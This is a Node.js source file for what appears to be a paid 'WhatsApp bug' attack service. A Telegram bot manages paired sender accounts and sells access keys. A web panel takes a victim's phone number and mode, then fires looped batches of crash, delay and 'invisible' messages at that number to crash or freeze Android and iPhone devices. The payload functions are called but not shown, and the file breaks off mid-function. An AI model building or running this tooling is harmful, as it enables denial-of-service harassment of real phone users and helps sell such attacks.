// ==================== MODULE IMPORTS ==================== //
const { Telegraf } = require("telegraf");
const fs = require('fs');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const path = require("path");
const config = require("./database/config.js");
const axios = require("axios");
const express = require('express');
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const AdmZip = require("adm-zip");
const tar = require("tar");
const os = require("os");
const fse = require("fs-extra");
const {
  default: makeWASocket,
  makeInMemoryStore,
  useMultiFileAuthState,
  DisconnectReason,
  generateWAMessageFromContent
} = require('lotusbail');

// ==================== CONFIGURATION ==================== //
const BOT_TOKEN = process.env.BOT_TOKEN;
const OWNER_ID = process.env.OWNER_ID;
const bot = new Telegraf(BOT_TOKEN);
const { domain, port } = require("./database/config");
const app = express();

// ==================== GLOBAL VARIABLES ==================== //
const sessions = new Map();
const file_session = "./sessions.json";
const sessions_dir = "./auth";
const file = "./database/akses.json";
const userPath = path.join(__dirname, "./database/user.json");
const cooldowns = {}; // key: username_mode, value: timestamp
let DEFAULT_COOLDOWN_MS = 5 * 60 * 1000; // default 5 menit
let userApiBug = null;
let sock;

const { connect, getDB } = require("./database/mongo.js");

// ==================== UTILITY FUNCTIONS ==================== //
async function loadAkses() {
  const db = getDB();
  let config = await db.collection("config").findOne();
  if (!config) {
    config = { owners: [], akses: [] };
    await db.collection("config").insertOne(config);
  }
  return config;
}

async function saveAkses(data) {
  const db = getDB();
  await db.collection("config").updateOne({}, { $set: data }, { upsert: true });
}

async function isOwner(id) {
  const data = await loadAkses();
  return data.owners.includes(id);
}

async function isAuthorized(id) {
  const data = await loadAkses();
  return isOwner(id) || data.akses.includes(id);
}

async function saveUsers(users) {
    const db = getDB();
    await db.collection('users').deleteMany({});
    if (users.length > 0) {
        await db.collection('users').insertMany(users);
    }
}

async function getUsers() {
    const db = getDB();
    return await db.collection('users').find().toArray();
}

function generateKey(length = 4) {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  return Array.from({ length }, () => chars.charAt(Math.floor(Math.random() * chars.length))).join('');
}

function parseDuration(str) {
  if (!str || typeof str !== "string") return null;
  
  const match = str.match(/^(\d+)(s|m|h|d)$/i);
  if (!match) return null;

  const value = parseInt(match[1]);
  const unit = match[2].toLowerCase();

  switch (unit) {
    case "s": return value * 1000;            // detik → ms
    case "m": return value * 60 * 1000;       // menit → ms
    case "h": return value * 60 * 60 * 1000;  // jam → ms
    case "d": return value * 24 * 60 * 60 * 1000; // hari → ms
    default: return null;
  }
}



function parseDuration(str) {
  if (!str || typeof str !== "string") return null;
  
  const match = str.match(/^(\d+)(s|m|h|d)$/i);
  if (!match) return null;

  const value = parseInt(match[1]);
  const unit = match[2].toLowerCase();

  switch (unit) {
    case "s": return value * 1000;            // detik → ms
    case "m": return value * 60 * 1000;       // menit → ms
    case "h": return value * 60 * 60 * 1000;  // jam → ms
    case "d": return value * 24 * 60 * 60 * 1000; // hari → ms
    default: return null;
  }
}

// ==================== GLOBAL COOLING SYSTEM ==================== //
// WhatsApp connection utilities
const saveActive = (BotNumber) => {
  const list = fs.existsSync(file_session) ? JSON.parse(fs.readFileSync(file_session)) : [];
  if (!list.includes(BotNumber)) {
    fs.writeFileSync(file_session, JSON.stringify([...list, BotNumber]));
  }
};

const sessionPath = (BotNumber) => {
  const dir = path.join(sessions_dir, `device${BotNumber}`);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  return dir;
};

const makeStatus = (number, status) => `\`\`\`
┌───────────────────────────┐
│ STATUS │ ${status.toUpperCase()}
├───────────────────────────┤
│ Nomor : ${number}
└───────────────────────────┘\`\`\``;

const makeCode = (number, code) => ({
  text: `\`\`\`
┌───────────────────────────┐
│ STATUS │ SEDANG PAIR
├───────────────────────────┤
│ Nomor : ${number}
│ Kode  : ${code}
└───────────────────────────┘
\`\`\``,
  parse_mode: "Markdown",
  reply_markup: {
    inline_keyboard: [
      [{ text: "!! 𝐒𝐚𝐥𝐢𝐧°𝐂𝐨𝐝𝐞 !!", callback_data: `salin|${code}` }]
    ]
  }
});

// ==================== WHATSAPP CONNECTION HANDLERS ==================== //

const initializeWhatsAppConnections = async () => {
  if (!fs.existsSync(file_session)) return;
  const activeNumbers = JSON.parse(fs.readFileSync(file_session));
  
  console.log(chalk.blue(`
┌──────────────────────────────┐
│ Ditemukan sesi WhatsApp aktif
├──────────────────────────────┤
│ Jumlah : ${activeNumbers.length}
└──────────────────────────────┘ `));

  for (const BotNumber of activeNumbers) {
    console.log(chalk.green(`Menghubungkan: ${BotNumber}`));
    const sessionDir = sessionPath(BotNumber);
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

    sock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      defaultQueryTimeoutMs: undefined,
    });

    await new Promise((resolve, reject) => {
      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        if (connection === "open") {
          console.log(`Bot ${BotNumber} terhubung!`);
          sessions.set(BotNumber, sock);
          return resolve();
        }
        if (connection === "close") {
          const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
          return shouldReconnect ? await initializeWhatsAppConnections() : reject(new Error("Koneksi ditutup"));
        }
      });
      sock.ev.on("creds.update", saveCreds);
    });
  }
};

const connectToWhatsApp = async (BotNumber, chatId, ctx) => {
  const sessionDir = sessionPath(BotNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  let statusMessage = await ctx.reply(`Pairing dengan nomor *${BotNumber}*...`, { parse_mode: "Markdown" });

  const editStatus = async (text) => {
    try {
      await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, text, { parse_mode: "Markdown" });
    } catch (e) {
      console.error("Gagal edit pesan:", e.message);
    }
  };

  sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  let isConnected = false;

  sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
    if (connection === "close") {
      const code = lastDisconnect?.error?.output?.statusCode;
      if (code >= 500 && code < 600) {
        await editStatus(makeStatus(BotNumber, "Menghubungkan ulang..."));
        return await connectToWhatsApp(BotNumber, chatId, ctx);
      }

      if (!isConnected) {
        await editStatus(makeStatus(BotNumber, "❌ Gagal terhubung."));
        return fs.rmSync(sessionDir, { recursive: true, force: true });
      }
    }

    if (connection === "open") {
      isConnected = true;
      sessions.set(BotNumber, sock);
      saveActive(BotNumber);
      return await editStatus(makeStatus(BotNumber, "✅ Berhasil terhubung."));
    }

    if (connection === "connecting") {
      await new Promise(r => setTimeout(r, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(BotNumber, "DEWA1234");
          const formatted = code.match(/.{1,4}/g)?.join("-") || code;
          await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, 
            makeCode(BotNumber, formatted).text, {
              parse_mode: "Markdown",
              reply_markup: makeCode(BotNumber, formatted).reply_markup
            });
        }
      } catch (err) {
        console.error("Error requesting code:", err);
        await editStatus(makeStatus(BotNumber, `❗ ${err.message}`));
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);
  return sock;
};
// ==================== BOT COMMANDS ==================== //

// Start command
bot.command("start", (ctx) => {
  const teks = `( 🍁 ) ─── ❖ 情報 ❖  
𝗪𝗵𝗮𝘁𝘀𝗮𝗽𝗽 × 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺  
─── 革命的な自動化システム ───  
高速・柔軟性・絶対的な安全性を備えた 次世代ボットが今、覚醒する。

〢「 𝐗𝐈𝐒 ☇ 𝐂𝐨𝐫𝐞 ° 𝐒𝐲𝐬𝐭𝐞𝐦𝐬 」
 ࿇ Author : —!s' Gxyenn 正式
 ࿇ Type : ( Case─Plugins )
 ࿇ League : Asia/Jakarta-
┌─────────
├──── ▢ ( 𖣂 ) Sender Handler
├── ▢ owner users
│── /addbot — <nomor>
│── /listsender —
│── /delsender — <nomor>
│── /add — <cards.json>
└────
┌─────────
├──── ▢ ( 𖣂 ) Key Manager
├── ▢ admin users
│── /ckey — <username,durasi>
│── /listkey —
│── /delkey — <username>
└────
┌─────────
├──── ▢ ( 𖣂 ) Access Controls
├── ▢ owner users
│── /addacces — <user/id>
│── /delacces — <user/id>
│── /addowner — <user/id>
│── /delowner — <user/id>
│── /setjeda — <1m/1d/1s>
└────`;
  ctx.replyWithPhoto(
    { url: "https://files.catbox.moe/ydj2rk.jpg" },
    {
      caption: teks,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "👤「所有者」", url: "https://t.me/gxyenn" },
          { text: "🕊「チャネル」", url: "t.me/gxyenn" }
          ]
        ]
      }
    }
  );
});

// Sender management commands
bot.command("addbot", async (ctx) => {
  const userId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ");

  if (!await isOwner(userId) && !await isAuthorized(userId)) {
    return ctx.reply("[ ! ] - ONLY ACCES USER\n—Please register first to access this feature.");
  }

  if (args.length < 2) {
    return ctx.reply("❌ *Syntax Error!*\n\n_Use : /addbot Number_\n_Example : /addbot 628xxxx_", { parse_mode: "Markdown" });
  }

  const BotNumber = args[1];
  await connectToWhatsApp(BotNumber, ctx.chat.id, ctx);
});

bot.command("listsender", async (ctx) => {
  const userId = ctx.from.id.toString();
  
  if (!await isOwner(userId)) {
    return ctx.reply("[ ! ] - ONLY OWNER USER\n—Please register first to access this feature.");
  }
  
  if (sessions.size === 0) return ctx.reply("Tidak ada sender aktif.");
  ctx.reply(`*Daftar Sender Aktif:*\n${[...sessions.keys()].map(n => `• ${n}`).join("\n")}`, 
    { parse_mode: "Markdown" });
});

bot.command("delbot", async (ctx) => {
  const userId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ");
  
  if (!await isOwner(userId) && !await isAuthorized(userId)) {
    return ctx.reply("[ ! ] - ONLY ACCES USER\n—Please register first to access this feature.");
  }
  
  if (args.length < 2) return ctx.reply("❌ *Syntax Error!*\n\n_Use : /delsender Number_\n_Example : /delsender 628xxxx_", { parse_mode: "Markdown" });

  const number = args[1];
  if (!sessions.has(number)) return ctx.reply("Sender tidak ditemukan.");

  try {
    const sessionDir = sessionPath(number);
    sessions.get(number).end();
    sessions.delete(number);
    fs.rmSync(sessionDir, { recursive: true, force: true });

    const data = JSON.parse(fs.readFileSync(file_session));
    fs.writeFileSync(file_session, JSON.stringify(data.filter(n => n !== number)));
    ctx.reply(`✅ Session untuk bot ${number} berhasil dihapus.`);
  } catch (err) {
    console.error(err);
    ctx.reply("Terjadi error saat menghapus sender.");
  }
});

// Helper untuk cari creds.json
async function findCredsFile(dir) {
  const files = fs.readdirSync(dir, { withFileTypes: true });
  for (const file of files) {
    const fullPath = path.join(dir, file.name);
    if (file.isDirectory()) {
      const result = await findCredsFile(fullPath);
      if (result) return result;
    } else if (file.name === "creds.json") {
      return fullPath;
    }
  }
  return null;
}

// ===== Command /add =====
bot.command("add", async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!await isOwner(userId)) {
    return ctx.reply("❌ Hanya owner yang bisa menggunakan perintah ini.");
  }

  const reply = ctx.message.reply_to_message;
  if (!reply || !reply.document) {
    return ctx.reply("❌ Balas file session dengan `/add`");
  }

  const doc = reply.document;
  const name = doc.file_name.toLowerCase();
  if (![".json", ".zip", ".tar", ".tar.gz", ".tgz"].some(ext => name.endsWith(ext))) {
    return ctx.reply("❌ File bukan session yang valid (.json/.zip/.tar/.tgz)");
  }

  await ctx.reply("🔄 Memproses session…");

  try {
    const link = await ctx.telegram.getFileLink(doc.file_id);
    const { data } = await axios.get(link.href, { responseType: "arraybuffer" });
    const buf = Buffer.from(data);
    const tmp = await fse.mkdtemp(path.join(os.tmpdir(), "sess-"));

    if (name.endsWith(".json")) {
      await fse.writeFile(path.join(tmp, "creds.json"), buf);
    } else if (name.endsWith(".zip")) {
      new AdmZip(buf).extractAllTo(tmp, true);
    } else {
      const tmpTar = path.join(tmp, name);
      await fse.writeFile(tmpTar, buf);
      await tar.x({ file: tmpTar, cwd: tmp });
    }

    const credsPath = await findCredsFile(tmp);
    if (!credsPath) {
      return ctx.reply("❌ creds.json tidak ditemukan di dalam file.");
    }

    const creds = await fse.readJson(credsPath);
    const botNumber = creds.me.id.split(":")[0];
    const destDir = sessionPath(botNumber);

    await fse.remove(destDir);
    await fse.copy(tmp, destDir);
    saveActive(botNumber);

    await connectToWhatsApp(botNumber, ctx.chat.id, ctx);

    return ctx.reply(`✅ Session *${botNumber}* berhasil ditambahkan & online.`, { parse_mode: "Markdown" });
  } catch (err) {
    console.error("❌ Error add session:", err);
    return ctx.reply(`❌ Gagal memproses session.\nError: ${err.message}`);
  }
});

// Key management commands
bot.command("ckey", async (ctx) => {
  const userId = ctx.from.id.toString();
  const args   = ctx.message.text.split(" ")[1];
  
  if (!await isOwner(userId) && !await isAuthorized(userId)) {
    return ctx.telegram.sendMessage(
      userId,
      "[ ! ] - ONLY ACCES USER\n—Please register first to access this feature."
    );
  }
  
  if (!args || !args.includes(",")) {
    return ctx.telegram.sendMessage(
      userId,
      "❌ *Syntax Error!*\n\n_Use : /ckey User,Day_\n_Example : /ckey rann,30d",
      { parse_mode: "Markdown" }
    );
  }

  const [username, durasiStr] = args.split(",");
  const durationMs            = parseDuration(durasiStr.trim());
  if (!durationMs) {
    return ctx.telegram.sendMessage(
      userId,
      "❌ Format durasi salah! Gunakan contoh: 7d / 1d / 12h"
    );
  }

  const key     = generateKey(4);
  const expired = Date.now() + durationMs;
  const users   = await getUsers();

  const userIndex = users.findIndex(u => u.username === username);
  if (userIndex !== -1) {
    users[userIndex] = { ...users[userIndex], key, expired };
  } else {
    users.push({ username, key, expired });
  }

  saveUsers(users);

  const expiredStr = new Date(expired).toLocaleString("id-ID", {
    year    : "numeric",
    month   : "2-digit",
    day     : "2-digit",
    hour    : "2-digit",
    minute  : "2-digit",
    timeZone: "Asia/Jakarta"
  });

  // Kirim detail ke user (DM)
  ctx.telegram.sendMessage(
    userId,
    `✅ *Key berhasil dibuat:*\n\n` +
    `🆔 *Username:* \`${username}\`\n` +
    `🔑 *Key:* \`${key}\`\n` +
    `⏳ *Expired:* _${expiredStr}_ WIB\n\n` +
    `*Note:*\n- Jangan di sebar\n- Jangan Di Freekan\n- Jangan Di Jual Lagi`,
    { parse_mode: "Markdown" }
  ).then(() => {
    // Setelah terkirim → kasih notifikasi di group
    ctx.reply("✅ Success Send Key");
  }).catch(err => {
    ctx.reply("❌ Gagal mengirim key ke user.");
    console.error("Error kirim key:", err);
  });
});

bot.command("listkey", async (ctx) => {
  const userId = ctx.from.id.toString();
  const users = await getUsers();
  
  if (!await isOwner(userId)) {
    return ctx.reply("[ ! ] - ONLY OWNER USER\n—Please register first to access this feature.");
  }
  
  if (users.length === 0) return ctx.reply("💢 No keys have been created yet.");

  let teks = `🕸️ *Active Key List:*\n\n`;
  users.forEach((u, i) => {
    const exp = new Date(u.expired).toLocaleString("id-ID", {
      year: "numeric",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
      timeZone: "Asia/Jakarta"
    });
    teks += `*${i + 1}. ${u.username}*\nKey: \`${u.key}\`\nExpired: _${exp}_ WIB\n\n`;
  });

  ctx.replyWithMarkdown(teks);
});

bot.command("delkey", async (ctx) => {
  const userId = ctx.from.id.toString();
  const username = ctx.message.text.split(" ")[1];
  
  if (!await isOwner(userId) && !await isAuthorized(userId)) {
    return ctx.reply("[ ! ] - ONLY ACCES USER\n—Please register first to access this feature.");
  }
  
  if (!username) return ctx.reply("❗Enter username!\nExample: /delkey rann");

  const users = await getUsers();
  const index = users.findIndex(u => u.username === username);
  if (index === -1) return ctx.reply(`❌ Username \`${username}\` not found.`, { parse_mode: "Markdown" });

  users.splice(index, 1);
  saveUsers(users);
  ctx.reply(`✅ Key belonging to *${username}* was successfully deleted.`, { parse_mode: "Markdown" });
});

// Access control commands
bot.command("addacces", async (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!await isOwner(userId)) {
    return ctx.reply("[ ! ] - ONLY OWNER USER\n—Please register first to access this feature.");
  }
  
  if (!id) return ctx.reply("❌ *Syntax Error!*\n\n_Use : /addacces Id_\n_Example : /addacces 7066156416_", { parse_mode: "Markdown" });

  const data = await loadAkses();
  if (data.akses.includes(id)) return ctx.reply("✅ User already has access.");

  data.akses.push(id);
  saveAkses(data);
  ctx.reply(`✅ Access granted to ID: ${id}`);
});

bot.command("delacces", async (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!await isOwner(userId)) {
    return ctx.reply("[ ! ] - ONLY OWNER USER\n—Please register first to access this feature.");
  }
  
  if (!id) return ctx.reply("❌ *Syntax Error!*\n\n_Use : /delacces Id_\n_Example : /delacces 7066156416_", { parse_mode: "Markdown" });

  const data = await loadAkses();
  if (!data.akses.includes(id)) return ctx.reply("❌ User not found.");

  data.akses = data.akses.filter(uid => uid !== id);
  saveAkses(data);
  ctx.reply(`✅ Access to user ID ${id} removed.`);
});

bot.command("addowner", async (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!await isOwner(userId)) {
    return ctx.reply("[ ! ] - ONLY OWNER USER\n—Please register first to access this feature.");
  }
  
  if (!id) return ctx.reply("❌ *Syntax Error!*\n\n_Use : /addowner Id_\n_Example : /addowner 7066156416_", { parse_mode: "Markdown" });

  const data = await loadAkses();
  if (data.owners.includes(id)) return ctx.reply("❌ Already an owner.");

  data.owners.push(id);
  saveAkses(data);
  ctx.reply(`✅ New owner added: ${id}`);
});

bot.command("delowner", async (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!await isOwner(userId)) {
    return ctx.reply("[ ! ] - ONLY OWNER USER\n—Please register first to access this feature.");
  }
  if (!id) return ctx.reply("❌ *Syntax Error!*\n\n_Use : /delowner Id_\n_Example : /delowner 7066156416_", { parse_mode: "Markdown" });

  const data = await loadAkses();

  if (!data.owners.includes(id)) return ctx.reply("❌ Not the owner.");

  data.owners = data.owners.filter(uid => uid !== id);
  saveAkses(data);

  ctx.reply(`✅ Owner ID ${id} was successfully deleted.`);
});

// ================== COMMAND /SETJEDA ================== //
bot.command("setjeda", async (ctx) => {
  const input = ctx.message.text.split(" ")[1]; 
  const ms = parseDuration(input);

  if (!ms) {
    return ctx.reply("❌ Format salah!\nContoh yang benar:\n- 30s (30 detik)\n- 5m (5 menit)\n- 1h (1 jam)\n- 1d (1 hari)");
  }

  globalThis.DEFAULT_COOLDOWN_MS = ms;
  DEFAULT_COOLDOWN_MS = ms; // sync ke alias lokal juga

  ctx.reply(`✅ Jeda berhasil diubah jadi *${input}* (${ms / 1000} detik)`);
});

// ==================== BOT INITIALIZATION ==================== //
console.clear();
console.log(chalk.blue(`⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣤⣶⣾⣿⣿⣿⣷⣶⣤⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀
⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀
⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀
⠀⠀⠀⠀⢰⡟⠛⠉⠙⢻⣿⡟⠋⠉⠙⢻⡇⠀⠀⠀⠀
⠀⠀⠀⠀⢸⣷⣀⣀⣠⣾⠛⣷⣄⣀⣀⣼⡏⠀⠀⠀⠀
⠀⠀⣀⠀⠀⠛⠋⢻⣿⣧⣤⣸⣿⡟⠙⠛⠀⠀⣀⠀⠀
⢀⣰⣿⣦⠀⠀⠀⠼⣿⣿⣿⣿⣿⡷⠀⠀⠀⣰⣿⣆⡀
⢻⣿⣿⣿⣧⣄⠀⠀⠁⠉⠉⠋⠈⠀⠀⣀⣴⣿⣿⣿⡿
⠀⠀⠀⠈⠙⠻⣿⣶⣄⡀⠀⢀⣠⣴⣿⠿⠛⠉⠁⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠉⣻⣿⣷⣿⣟⠉⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣠⣴⣿⠿⠋⠉⠙⠿⣷⣦⣄⡀⠀⠀⠀⠀
⣴⣶⣶⣾⡿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣷⣶⣶⣦
⠙⢻⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⡿⠋
⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀
╭╮╱╭┳━━━┳━━━┳╮╱╱╭━━━┳━━━┳━╮╱╭┳━━━╮
┃┃╱┃┃╭━╮┃╭━╮┃┃╱╱┃╭━╮┃╭━╮┃┃╰╮┃┃╭━╮┃
┃╰━╯┃┃╱┃┃╰━━┫┃╱╱┃┃╱┃┃┃╱┃┃╭╮╰╯┃┃╱┃┃
┃╭━╮┃┃╱┃┣━━╮┃┃╱╭┫┃╱┃┃┃╱┃┃┃╰╮┃┃┃╱┃┃
┃┃╱┃┃╰━╯┃╰━╯┃╰━╯┃╰━╯┃╰━╯┃┃╱┃┃┃╰━╯┃
╰╯╱╰┻━━━┻━━━┻━━━┻━━━┻━━━┻╯╱╰━┻━━━╯⠀⠀⠀⠀⠀⠀⠀
`));

initializeWhatsAppConnections();

// ==================== WEB SERVER ==================== //
app.use(bodyParser.urlencoded({ extended: true }));
app.use(cookieParser());

async function startApp() {
  await connect();

  bot.launch();
  console.log(chalk.red(`
╭─☐ BOT Vely Bug
├─ ID OWN : ${OWNER_ID}
├─ DEVELOPER : Gxyenn 正式 
├─ MY SUPPORT : ALLAH 
├─ BOT : CONNECTED ✅
╰───────────────────`));

  initializeWhatsAppConnections();

  app.listen(port, () => {
    console.log(`🚀 Server aktif di ${domain}:${port}`);
  });
}

// ==================== WEB SERVER ==================== //
app.use(bodyParser.urlencoded({ extended: true }));
app.use(cookieParser());

app.get("/", (req, res) => {
  const filePath = path.join(__dirname, "HCS-View", "Login.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ Gagal baca Login.html");
    res.send(html);
  });
});

app.get("/login", (req, res) => {
  const msg = req.query.msg || "";
  const filePath = path.join(__dirname, "HCS-View", "Login.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ Gagal baca file Login.html");
    res.send(html);
  });
});

app.post("/auth", async (req, res) => {
  const { username, key } = req.body;
  const users = await getUsers();

  const user = users.find(u => u.username === username && u.key === key);
  if (!user) {
    return res.redirect("/login?msg=" + encodeURIComponent("Username atau Key salah!"));
  }

  res.cookie("sessionUser", username, { maxAge: 60 * 60 * 1000 });
  res.redirect("/execution");
});

app.get("/execution", async (req, res) => {
  const username = req.cookies.sessionUser;
  const msg = req.query.msg || "";
  const filePath = "./HCS-View/Login.html";

  fs.readFile(filePath, "utf8", async (err, html) => {
    if (err) return res.status(500).send("❌ Gagal baca file Login.html");

    if (!username) return res.send(html);

    const users = await getUsers();
    const currentUser = users.find(u => u.username === username);

    if (!currentUser || !currentUser.expired || Date.now() > currentUser.expired) {
      return res.send(html);
    }

    const targetNumber = req.query.target;
    const mode = req.query.mode;
    const target = `${targetNumber}@s.whatsapp.net`;

    if (sessions.size === 0) {
      return res.send(executionPage("🚧 MAINTENANCE SERVER !!", {
        message: "Tunggu sampai maintenance selesai..."
      }, false, currentUser, "", mode));
    }

    if (!targetNumber) {
      if (!mode) {
        return res.send(executionPage("✅ Server ON", {
          message: "Pilih mode yang ingin digunakan."
        }, true, currentUser, "", ""));
      }

      if (["andros", "ios"].includes(mode)) {
        return res.send(executionPage("✅ Server ON", {
          message: "Masukkan nomor target (62xxxxxxxxxx)."
        }, true, currentUser, "", mode));
      }

      return res.send(executionPage("❌ Mode salah", {
        message: "Mode tidak dikenali. Gunakan ?mode=andros atau ?mode=ios."
      }, false, currentUser, "", ""));
    }

    if (!/^\d+$/.test(targetNumber)) {
      return res.send(executionPage("❌ Format salah", {
        target: targetNumber,
        message: "Nomor harus hanya angka dan diawali dengan nomor negara"
      }, true, currentUser, "", mode));
    }

// == TEMPAT PENGIRIMAN BUG == \\
// sesuaiin aja ama pemanggilan func tadi / combo
    try {
      if (mode === "andros") {
        androcrash(24, target);
      } else if (mode === "ios") {
        Ipongcrash(24, target);
      } else if (mode === "andros-delay") {
        androdelay(24, target);
      } else if (mode === "invis-iphone") {
        Iponginvis(24, target);
      } else {
        throw new Error("Mode tidak dikenal.");
      }

      return res.send(executionPage("✅ S U C C E S", {
        target: targetNumber,
        timestamp: new Date().toLocaleString("id-ID"),
        message: `𝐄𝐱𝐞𝐜𝐮𝐭𝐞 𝐌𝐨𝐝𝐞: ${mode.toUpperCase()}`
      }, false, currentUser, "", mode));
    } catch (err) {
      return res.send(executionPage("❌ Gagal kirim", {
        target: targetNumber,
        message: err.message || "Terjadi kesalahan saat pengiriman."
      }, false, currentUser, "Gagal mengeksekusi nomor target.", mode));
    }
  });
});

app.get("/logout", (req, res) => {
  res.clearCookie("sessionUser");
  res.redirect("/login");
});

startApp();


// ==================== EXPORTS ==================== //
module.exports = { 
  loadAkses, 
  saveAkses, 
  isOwner, 
  isAuthorized,
  saveUsers,
  getUsers
};

// ==================== FLOOD FUNCTIONS ==================== //
// ====== TEMPAT FUNCTION BUGS ====== //


// ====== TEMPAT PEMANGGILAN FUNC & COMBO =====\\
async function androdelay(durationHours, target) {
  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      console.log(`✅ Selesai! Total batch terkirim: ${batch - 1}`);
      return;
    }

    try {
      if (count < 400) {
        await Promise.all([
          JawaDelay(sock, target)
        ]);
        console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/400 Send Delay 🦠
└────────────────────────┘
  `));
        count++;
        setTimeout(sendNext, 2000); // ⏳ jeda 2 detik antar kiriman
      } else {
        console.log(chalk.green(`✅ Succes Send Bugs to ${target} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( Grade Xtordcv 🍂 777 ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 5000); // ⏳ jeda 5 detik antar batch
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`❌ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 2000); // tetap pakai jeda antar kiriman
    }
  };
  sendNext();
}

async function androcrash(durationHours, target) {
  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      console.log(`✅ Selesai! Total batch terkirim: ${batch - 1}`);
      return;
    }

    try {
      if (count < 400) {
        await Promise.all([         
         VenCrash(target),
         ZieeInvisForceIOS(sock, target)
        ]);
        console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/400 Send Bug Crash 
└────────────────────────┘
  `));
        count++;
        setTimeout(sendNext, 2000); // ⏳ jeda 2 detik antar kiriman
      } else {
        console.log(chalk.green(`👀 Succes Send Bugs to ${X} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( Grade Xtordcv 🍂 777 ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 5000); // ⏳ jeda 5 detik antar batch
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`❌ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 2000); // tetap pakai jeda antar kiriman
    }
  };
  sendNext();
}

async function Ipongcrash(durationHours, target) {
  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      console.log(`✅ Selesai! Total batch terkirim: ${batch - 1}`);
      return;
    }

    try {
      if (count < 400) {
        await Promise.all([
          iosKontakNih(sock, target),
          crashIos(sock, target),
          uiIos(sock, target),
          iosNick(sock, target)
        ]);
        console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/400 Crash iPhone 
└────────────────────────┘
  `));
        count++;
        setTimeout(sendNext, 2000); // ⏳ jeda 2 detik antar kiriman
      } else {
        console.log(chalk.green(`👀 Succes Send Bugs to ${X} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( Grade Xtordcv 🍂 777 ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 5000); // ⏳ jeda 5 detik antar batch
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`❌ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 2000); // tetap pakai jeda antar kiriman
    }
  };
  sendNext();
}

async function Iponginvis(durationHours, target) {
  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      console.log(`✅ Selesai! Total batch terkirim: ${batch - 1}`);
      return;
    }

    try {
      if (count < 400) {
        await Promise.all([
